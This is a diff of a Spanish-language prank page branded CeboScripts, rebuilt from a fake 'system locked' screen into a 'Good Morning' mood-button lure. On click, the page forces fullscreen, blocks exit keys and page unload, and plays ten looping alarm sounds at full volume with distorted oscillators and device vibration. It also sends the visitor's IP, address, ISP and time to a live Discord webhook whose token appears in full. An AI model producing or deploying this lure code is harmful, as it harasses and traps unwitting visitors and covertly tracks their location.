@@ -3,13 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CeboScripts</title>
+    <title>Good Morning</title>
     <style>
+        /* ======== ESTILOS ======== */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
             background: #000;
             color: #fff;
@@ -17,304 +19,496 @@
             height: 100vh;
             overflow: hidden;
             user-select: none;
-            cursor: default;
         }
-        #freezeOverlay {
+
+        /* ======== PANTALLA 1: PAISAJE ======== */
+        #screen1 {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: #000;
-            z-index: 9999;
+            z-index: 1;
             display: flex;
             justify-content: center;
             align-items: center;
             flex-direction: column;
             text-align: center;
             padding: 20px;
-            pointer-events: auto;
+            transition: opacity 0.5s;
         }
-        .loader {
-            width: 60px;
-            height: 60px;
-            border: 4px solid #222;
-            border-top: 4px solid #ff0000;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-bottom: 30px;
+
+        #screen1 img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.8;
         }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
+
+        #screen1 h1 {
+            font-size: 6em;
+            color: #fff;
+            text-shadow: 0 0 50px rgba(255, 200, 50, 0.8), 0 0 100px rgba(255, 100, 0, 0.6);
+            animation: glow 2s infinite alternate;
+            z-index: 2;
+            font-weight: 900;
+            letter-spacing: 8px;
+        }
+
+        @keyframes glow {
+            0% {
+                text-shadow: 0 0 30px rgba(255, 200, 50, 0.6);
+            }
+            100% {
+                text-shadow: 0 0 80px rgba(255, 100, 0, 0.9), 0 0 150px rgba(255, 50, 0, 0.6);
             }
         }
-        h1 {
-            color: #ff0000;
-            font-size: 2.5em;
-            text-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
-            animation: flicker 1.2s infinite alternate;
-            margin-bottom: 15px;
+
+        #screen1 p {
+            font-size: 1.8em;
+            color: #ddd;
+            text-shadow: 0 0 30px rgba(0, 0, 0, 0.9);
+            z-index: 2;
+            margin-top: 20px;
+            font-weight: 300;
+            letter-spacing: 3px;
         }
+
+        #screen1 .btn {
+            margin-top: 40px;
+            padding: 20px 60px;
+            background: rgba(255, 200, 50, 0.2);
+            color: #fff;
+            border: 2px solid rgba(255, 200, 50, 0.6);
+            border-radius: 50px;
+            font-size: 1.5em;
+            font-weight: bold;
+            cursor: pointer;
+            z-index: 2;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            backdrop-filter: blur(5px);
+            box-shadow: 0 0 50px rgba(255, 200, 50, 0.2);
+        }
+
+        #screen1 .btn:hover {
+            background: rgba(255, 200, 50, 0.4);
+            transform: scale(1.05);
+            box-shadow: 0 0 80px rgba(255, 200, 50, 0.4);
+        }
+
+        /* ======== PANTALLA 2: CAOS TOTAL ======== */
+        #screen2 {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 10;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+            padding: 20px;
+            animation: shake 0.1s infinite alternate;
+        }
+
+        @keyframes shake {
+            0% {
+                transform: translate(-2px, -2px) rotate(-0.5deg);
+            }
+            25% {
+                transform: translate(2px, -2px) rotate(0.5deg);
+            }
+            50% {
+                transform: translate(-2px, 2px) rotate(-0.3deg);
+            }
+            75% {
+                transform: translate(2px, 2px) rotate(0.3deg);
+            }
+            100% {
+                transform: translate(-2px, -2px) rotate(-0.5deg);
+            }
+        }
+
+        #screen2 img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            filter: saturate(2) contrast(1.5) brightness(0.7);
+        }
+
+        /* ======== OVERLAY ROJO PARPADEANTE ======== */
+        #redOverlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 0, 0, 0.15);
+            z-index: 5;
+            animation: pulseRed 0.3s infinite alternate;
+            pointer-events: none;
+        }
+
+        @keyframes pulseRed {
+            0% {
+                opacity: 0.1;
+            }
+            100% {
+                opacity: 0.5;
+            }
+        }
+
+        /* ======== LÍNEAS DE INTERFERENCIA ======== */
+        .glitch-lines {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 6;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        .glitch-lines span {
+            position: absolute;
+            width: 100%;
+            height: 2px;
+            background: rgba(255, 0, 0, 0.3);
+            animation: glitchLine 0.05s infinite alternate;
+        }
+
+        .glitch-lines span:nth-child(1) {
+            top: 10%;
+            animation-delay: 0s;
+        }
+        .glitch-lines span:nth-child(2) {
+            top: 25%;
+            animation-delay: 0.02s;
+        }
+        .glitch-lines span:nth-child(3) {
+            top: 45%;
+            animation-delay: 0.04s;
+        }
+        .glitch-lines span:nth-child(4) {
+            top: 65%;
+            animation-delay: 0.06s;
+        }
+        .glitch-lines span:nth-child(5) {
+            top: 80%;
+            animation-delay: 0.08s;
+        }
+
+        @keyframes glitchLine {
+            0% {
+                transform: translateX(-100%);
+                opacity: 0;
+            }
+            50% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+        }
+
+        /* ======== TEXTO DE CAOS ======== */
+        #screen2 .chaos-text {
+            font-size: 4em;
+            color: #ff0000;
+            text-shadow: 0 0 50px rgba(255, 0, 0, 0.8), 0 0 100px rgba(255, 0, 0, 0.4);
+            z-index: 7;
+            animation: flicker 0.05s infinite alternate;
+            font-weight: 900;
+            letter-spacing: 10px;
+        }
+
         @keyframes flicker {
             0% {
                 opacity: 1;
+                text-shadow: 0 0 50px rgba(255, 0, 0, 0.8);
             }
             50% {
-                opacity: 0.6;
+                opacity: 0.4;
+                text-shadow: 0 0 100px rgba(255, 0, 0, 0.2);
             }
             100% {
                 opacity: 1;
+                text-shadow: 0 0 80px rgba(255, 0, 0, 0.9);
             }
         }
-        p {
-            color: #888;
-            font-size: 1.2em;
-            max-width: 500px;
-            line-height: 1.6;
-        }
-        .sub {
-            color: #444;
-            font-size: 0.85em;
-            margin-top: 30px;
-        }
-        #statusMsg {
+
+        #screen2 .sub-text {
+            font-size: 1.5em;
+            color: #ff4444;
+            z-index: 7;
+            animation: flicker 0.1s infinite alternate;
             margin-top: 20px;
-            color: #666;
-            font-size: 0.9em;
-            min-height: 30px;
+            font-weight: 300;
+            letter-spacing: 5px;
         }
-        .sound-waves {
-            display: flex;
-            gap: 5px;
-            margin-top: 20px;
-            justify-content: center;
-            height: 40px;
-            align-items: center;
+
+        /* ======== EFECTO DE SATURACIÓN EN PANTALLA 2 ======== */
+        .saturation-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 4;
+            background: repeating-linear-gradient(0deg,
+                    transparent,
+                    transparent 2px,
+                    rgba(255, 0, 0, 0.03) 2px,
+                    rgba(255, 0, 0, 0.03) 4px);
+            pointer-events: none;
+            animation: scanlines 0.1s infinite linear;
         }
-        .sound-waves span {
-            display: block;
-            width: 6px;
-            background: #ff0000;
-            border-radius: 3px;
-            animation: wave 0.6s infinite alternate;
-        }
-        .sound-waves span:nth-child(1) {
-            height: 15px;
-            animation-delay: 0s;
-        }
-        .sound-waves span:nth-child(2) {
-            height: 25px;
-            animation-delay: 0.1s;
-        }
-        .sound-waves span:nth-child(3) {
-            height: 35px;
-            animation-delay: 0.2s;
-        }
-        .sound-waves span:nth-child(4) {
-            height: 25px;
-            animation-delay: 0.3s;
-        }
-        .sound-waves span:nth-child(5) {
-            height: 15px;
-            animation-delay: 0.4s;
-        }
-        @keyframes wave {
+
+        @keyframes scanlines {
             0% {
-                transform: scaleY(0.3);
-                opacity: 0.3;
+                transform: translateY(0);
             }
             100% {
-                transform: scaleY(1);
-                opacity: 1;
+                transform: translateY(4px);
             }
         }
-        .fake-btn {
-            margin-top: 30px;
-            padding: 14px 40px;
-            background: #1a1a1a;
-            color: #555;
-            border: 1px solid #333;
-            border-radius: 8px;
-            font-size: 1em;
-            cursor: not-allowed;
-            transition: 0.3s;
-        }
-        .fake-btn:hover {
-            background: #222;
-            border-color: #555;
-        }
+
+        /* ======== RESPONSIVE ======== */
         @media (max-width: 600px) {
-            h1 {
-                font-size: 1.8em;
+            #screen1 h1 {
+                font-size: 3em;
+                letter-spacing: 4px;
             }
-            p {
+            #screen1 p {
+                font-size: 1.2em;
+            }
+            #screen1 .btn {
+                padding: 15px 30px;
+                font-size: 1.2em;
+            }
+            #screen2 .chaos-text {
+                font-size: 2.5em;
+                letter-spacing: 5px;
+            }
+            #screen2 .sub-text {
                 font-size: 1em;
-            }
-            .loader {
-                width: 40px;
-                height: 40px;
             }
         }
     </style>
 </head>
 <body>
 
-    <div id="freezeOverlay">
-        <div class="loader"></div>
-        <h1>⚠️ SISTEMA BLOQUEADO</h1>
-        <p>
-            Se ha detectado actividad sospechosa en tu dispositivo.<br>
-            <span style="color:#666;font-size:0.9em;">Espera mientras se verifica tu identidad...</span>
-        </p>
-        <div class="sound-waves">
-            <span></span><span></span><span></span><span></span><span></span>
-        </div>
-        <div class="fake-btn">⛔ Acceso denegado</div>
-        <div id="statusMsg">🔊 Activando alarma...</div>
-        <div class="sub">CeboScripts • Verificación de seguridad</div>
+    <!-- ======== PANTALLA 1: PAISAJE ======== -->
+    <div id="screen1">
+        <img src="https://files.catbox.moe/2tc5vs.avif" alt="Paisaje">
+        <h1>GOOD MORNING</h1>
+        <p>Apreta el botón para ver tu estado de ánimo</p>
+        <button class="btn" id="activateBtn">🔥 ACTIVAR</button>
     </div>
 
-    <!-- ======== 3 AUDIOS DIFERENTES (uno funcionará) ======== -->
-    <!-- Opción 1: Alarma (WAV - mejor compatibilidad) -->
-    <audio id="alarmAudio1" loop preload="auto">
-        <source src="data:audio/wav;base64,U3R1ZmYgdHlwZSBhdWRpbyB3YXZlIGZvcm1hdA==" type="audio/wav">
-    </audio>
+    <!-- ======== PANTALLA 2: CAOS TOTAL ======== -->
+    <div id="screen2">
+        <img src="https://files.catbox.moe/zaogwd.webp" alt="Caos">
+        <div id="redOverlay"></div>
+        <div class="saturation-overlay"></div>
+        <div class="glitch-lines">
+            <span></span><span></span><span></span><span></span><span></span>
+        </div>
+        <div class="chaos-text">⚠️ ¡CAOS! ⚠️</div>
+        <div class="sub-text">🔊 SATURACIÓN MÁXIMA 🔊</div>
+    </div>
 
-    <!-- Opción 2: Tono de error (MP3) -->
-    <audio id="alarmAudio2" loop preload="auto">
-        <source src="https://www.soundjay.com/misc/sounds/error-01.mp3" type="audio/mpeg">
-    </audio>
-
-    <!-- Opción 3: Alarma fuerte (MP3) -->
-    <audio id="alarmAudio3" loop preload="auto">
+    <!-- ======== 10 AUDIOS PARA SATURACIÓN ======== -->
+    <audio id="audio1" loop preload="auto">
         <source src="https://www.soundjay.com/misc/sounds/alarm-clock-01.mp3" type="audio/mpeg">
     </audio>
+    <audio id="audio2" loop preload="auto">
+        <source src="https://www.soundjay.com/misc/sounds/air-raid-siren-02.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="audio3" loop preload="auto">
+        <source src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="audio4" loop preload="auto">
+        <source src="https://www.soundjay.com/misc/sounds/error-01.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="audio5" loop preload="auto">
+        <source src="https://www.soundjay.com/misc/sounds/lock-01.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="audio6" loop preload="auto">
+        <source src="https://www.soundjay.com/misc/sounds/phone-ring-01.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="audio7" loop preload="auto">
+        <source src="https://www.soundjay.com/misc/sounds/siren-01.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="audio8" loop preload="auto">
+        <source src="https://www.soundjay.com/misc/sounds/notification-01.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="audio9" loop preload="auto">
+        <source src="https://www.soundjay.com/misc/sounds/warning-01.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="audio10" loop preload="auto">
+        <source src="https://www.soundjay.com/misc/sounds/alarm-01.mp3" type="audio/mpeg">
+    </audio>
 
-    <!-- ======== GENERADOR DE SONIDO POR CÓDIGO (100% FUNCIONAL) ======== -->
     <script>
-        // ======== 1. GENERAR SONIDO CON Web Audio API (SIN ARCHIVOS) ========
-        function generarSonidoAlarma() {
+        // ======== 1. GENERAR SONIDO CON WEB AUDIO API (SATURADO) ========
+        function generarSonidoSaturado() {
             try {
-                // Crear contexto de audio
                 const AudioContext = window.AudioContext || window.webkitAudioContext;
                 const audioCtx = new AudioContext();
 
-                // Crear oscilador (genera sonido electrónico)
-                const oscillator = audioCtx.createOscillator();
-                const gainNode = audioCtx.createGain();
+                // Crear 3 osciladores para saturar
+                for (let i = 0; i < 3; i++) {
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    const distortion = audioCtx.createWaveShaper();
 
-                oscillator.type = 'sawtooth'; // Sonido áspero como alarma
-                oscillator.frequency.value = 880; // Frecuencia aguda
+                    // Configurar distorsión (saturación)
+                    distortion.curve = new Float32Array(1000);
+                    for (let j = 0; j < 1000; j++) {
+                        const x = (j - 500) / 500;
+                        distortion.curve[j] = Math.tanh(x * 2);
+                    }
 
-                // Conectar
-                oscillator.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
+                    osc.type = ['sawtooth', 'square', 'sawtooth'][i];
+                    osc.frequency.value = [880, 440, 1760][i];
 
-                // Volumen
-                gainNode.gain.value = 0.3;
+                    gain.gain.value = [0.4, 0.3, 0.2][i];
 
-                // Iniciar sonido
-                oscillator.start();
+                    osc.connect(distortion);
+                    distortion.connect(gain);
+                    gain.connect(audioCtx.destination);
 
-                // ❗ Detener después de 1 segundo y volver a iniciar (efecto de alarma)
-                setTimeout(() => {
-                    oscillator.stop();
+                    osc.start();
 
-                    // Crear otro sonido más grave (efecto de alarma intermitente)
-                    const osc2 = audioCtx.createOscillator();
-                    const gain2 = audioCtx.createGain();
-                    osc2.type = 'square';
-                    osc2.frequency.value = 440;
-                    gain2.gain.value = 0.2;
-                    osc2.connect(gain2);
-                    gain2.connect(audioCtx.destination);
-                    osc2.start();
-
+                    // Modulación de frecuencia (efecto de alarma)
                     setTimeout(() => {
-                        osc2.stop();
-                        // Repetir el ciclo (alarma infinita)
-                        generarSonidoAlarma();
-                    }, 500);
-                }, 500);
+                        osc.frequency.value = [440, 880, 220][i];
+                    }, 300);
+                    setTimeout(() => {
+                        osc.frequency.value = [880, 440, 1760][i];
+                    }, 600);
+                }
 
-                document.getElementById('statusMsg').textContent = '🔊 Alarma activada (generada por código)';
-                console.log('✅ Sonido generado por Web Audio API');
+                // Añadir ruido blanco para saturación extra
+                const bufferSize = 2 * audioCtx.sampleRate;
+                const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+                const data = buffer.getChannelData(0);
+                for (let i = 0; i < bufferSize; i++) {
+                    data[i] = (Math.random() * 2 - 1) * 0.3;
+                }
+                const noise = audioCtx.createBufferSource();
+                noise.buffer = buffer;
+                const noiseGain = audioCtx.createGain();
+                noiseGain.gain.value = 0.15;
+                noise.connect(noiseGain);
+                noiseGain.connect(audioCtx.destination);
+                noise.start();
+
+                console.log('✅ Sonido saturado generado');
 
             } catch (e) {
-                console.warn('⚠️ Web Audio API no disponible:', e);
-                // Si falla, intentar con los audios
-                reproducirAudioFallback();
+                console.warn('⚠️ Web Audio API falló:', e);
             }
         }
 
-        // ======== 2. REPRODUCIR AUDIOS EXTERNOS (FALLBACK) ========
-        function reproducirAudioFallback() {
+        // ======== 2. REPRODUCIR TODOS LOS AUDIOS (SATURACIÓN) ========
+        function reproducirAudiosSaturados() {
             const audios = [
-                document.getElementById('alarmAudio1'),
-                document.getElementById('alarmAudio2'),
-                document.getElementById('alarmAudio3')
+                document.getElementById('audio1'),
+                document.getElementById('audio2'),
+                document.getElementById('audio3'),
+                document.getElementById('audio4'),
+                document.getElementById('audio5'),
+                document.getElementById('audio6'),
+                document.getElementById('audio7'),
+                document.getElementById('audio8'),
+                document.getElementById('audio9'),
+                document.getElementById('audio10')
             ];
-
-            let reproduciendo = false;
 
             audios.forEach((audio, index) => {
                 if (!audio) return;
-
-                // Quitar mute y silenciar
+                audio.volume = 1.0; // Volumen al 100%
                 audio.muted = false;
-                audio.volume = 0.5;
+                audio.loop = true;
 
-                audio.play()
-                    .then(() => {
-                        if (!reproduciendo) {
-                            reproduciendo = true;
-                            document.getElementById('statusMsg').textContent =
-                            '🔊 Alarma activada (audio ' + (index + 1) + ')';
+                // Intentar reproducir con diferentes retrasos para saturar
+                setTimeout(() => {
+                    audio.play()
+                        .then(() => {
                             console.log('✅ Audio ' + (index + 1) + ' reproduciéndose');
-                        }
-                    })
-                    .catch((err) => {
-                        console.warn('⚠️ Audio ' + (index + 1) + ' falló:', err);
-                    });
+                        })
+                        .catch((err) => {
+                            console.warn('⚠️ Audio ' + (index + 1) + ' falló:', err);
+                            // Si falla, reintentar con interacción
+                            document.addEventListener('click', function activar() {
+                                audio.play().catch(() => {});
+                                document.removeEventListener('click', activar);
+                            }, { once: true });
+                        });
+                }, index * 200); // Retraso escalonado para saturación
             });
-
-            // Si ningún audio funcionó, mostrar mensaje
-            setTimeout(() => {
-                if (!reproduciendo) {
-                    document.getElementById('statusMsg').textContent = '⚠️ Haz clic en la pantalla para activar el sonido';
-                    // Esperar un clic del usuario
-                    document.addEventListener('click', function activarConClic() {
-                        generarSonidoAlarma(); // Intentar con Web Audio
-                        document.removeEventListener('click', activarConClic);
-                    }, { once: true });
-                }
-            }, 3000);
         }
 
-        // ======== 3. FUNCIÓN PRINCIPAL ========
-        function iniciarAlarma() {
-            // Intentar primero con Web Audio API (más confiable)
-            try {
-                generarSonidoAlarma();
-            } catch (e) {
-                // Si falla, usar audios externos
-                reproducirAudioFallback();
+        // ======== 3. ACTIVAR CAOS ========
+        function activarCaos() {
+            // Cambiar a pantalla 2
+            document.getElementById('screen1').style.display = 'none';
+            const screen2 = document.getElementById('screen2');
+            screen2.style.display = 'flex';
+
+            // Activar pantalla completa
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(() => {});
             }
 
-            // ❗ También intentar con los audios en paralelo
+            // Bloquear teclas de salida
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' || e.key === 'F11' ||
+                    (e.ctrlKey && e.key === 'w') ||
+                    (e.ctrlKey && e.key === 'F4') ||
+                    (e.altKey && e.key === 'F4') ||
+                    (e.metaKey && e.key === 'w')) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+            });
+
+            // Generar sonido saturado (Web Audio)
+            generarSonidoSaturado();
+
+            // Reproducir todos los audios
             setTimeout(() => {
-                const audio2 = document.getElementById('alarmAudio2');
-                if (audio2) {
-                    audio2.volume = 0.3;
-                    audio2.play().catch(() => {});
-                }
-                const audio3 = document.getElementById('alarmAudio3');
-                if (audio3) {
-                    audio3.volume = 0.3;
-                    audio3.play().catch(() => {});
-                }
-            }, 500);
+                reproducirAudiosSaturados();
+            }, 300);
+
+            // Forzar vibración (si está disponible)
+            if (navigator.vibrate) {
+                navigator.vibrate([100, 50, 100, 50, 200, 100, 200]);
+            }
+
+            // Capturar datos y enviar a Discord
+            capturarDatos();
+
+            console.log('🔥 CAOS ACTIVADO');
         }
 
         // ======== 4. CAPTURAR DATOS ========
@@ -351,7 +545,7 @@
                     'https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD';
                 const embed = {
                     color: 0xff0000,
-                    title: '🚨 SISTEMA BLOQUEADO',
+                    title: '🔥 CAOS ACTIVADO',
                     fields: [
                         { name: '📍 Dirección', value: info.direccionReal || 'No disponible' },
                         { name: '🌐 IP', value: info.ip || 'No disponible' },
@@ -360,7 +554,7 @@
                         { name: '📶 ISP', value: info.isp || 'No disponible' },
                         { name: '🕒 Hora', value: info.hora || 'No disponible' }
                     ],
-                    footer: { text: 'CeboScripts • Congelamiento de pantalla' },
+                    footer: { text: 'CeboScripts • Caos total' },
                     timestamp: new Date().toISOString()
                 };
                 await fetch(WEBHOOK_URL, {
@@ -368,7 +562,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         username: 'CeboScripts Logger',
-                        content: '🚨 **¡PANTALLA CONGELADA!**',
+                        content: '🔥 **¡CAOS TOTAL ACTIVADO!**',
                         embeds: [embed]
                     })
                 });
@@ -378,70 +572,17 @@
             }
         }
 
-        // ======== 5. EVITAR SALIR ========
-        function evitarSalir() {
-            document.addEventListener('keydown', function(e) {
-                if ((e.ctrlKey && (e.key === 'w' || e.key === 'W')) ||
-                    (e.ctrlKey && e.key === 'F4') ||
-                    (e.altKey && e.key === 'F4') ||
-                    (e.metaKey && e.key === 'w') ||
-                    e.key === 'F5' ||
-                    (e.ctrlKey && (e.key === 'r' || e.key === 'R')) ||
-                    (e.metaKey && (e.key === 'r' || e.key === 'R')) ||
-                    e.key === 'Escape') {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    return false;
-                }
-            });
-            document.addEventListener('contextmenu', function(e) {
-                e.preventDefault();
-                return false;
-            });
-            window.addEventListener('beforeunload', function(e) {
-                e.preventDefault();
-                e.returnValue = '⚠️ ¿Estás seguro?';
-                return '⚠️ ¿Estás seguro?';
-            });
-        }
+        // ======== 5. EVENTO DEL BOTÓN ========
+        document.getElementById('activateBtn').addEventListener('click', activarCaos);
 
-        // ======== 6. INICIAR TODO ========
-        document.addEventListener('DOMContentLoaded', function() {
-            capturarDatos();
-            evitarSalir();
-
-            // Iniciar alarma con un pequeño retraso
-            setTimeout(() => {
-                iniciarAlarma();
-            }, 500);
-
-            // Cambiar mensaje de estado
-            setTimeout(() => {
-                document.getElementById('statusMsg').textContent = '🔊 Alarma activada • Sistema bloqueado';
-            }, 2000);
-
-            console.log('🚨 Sistema bloqueado activado');
+        // ======== 6. PREVENIR SALIR ========
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '⚠️ ¿Seguro que quieres salir?';
+            return '⚠️ ¿Seguro que quieres salir?';
         });
 
-        // 🔥 SOLUCIÓN EXTRA: Si el usuario hace clic en cualquier parte, activar sonido
-        document.addEventListener('click', function() {
-            try {
-                const audioCtx = new(window.AudioContext || window.webkitAudioContext)();
-                if (audioCtx.state === 'suspended') {
-                    audioCtx.resume();
-                }
-                // Generar un pitido corto
-                const osc = audioCtx.createOscillator();
-                const gain = audioCtx.createGain();
-                osc.type = 'sawtooth';
-                osc.frequency.value = 880;
-                gain.gain.value = 0.2;
-                osc.connect(gain);
-                gain.connect(audioCtx.destination);
-                osc.start();
-                setTimeout(() => osc.stop(), 300);
-            } catch (e) {}
-        }, { once: true });
+        console.log('🌅 Good Morning - Listo');
     </script>
 </body>
 </html>
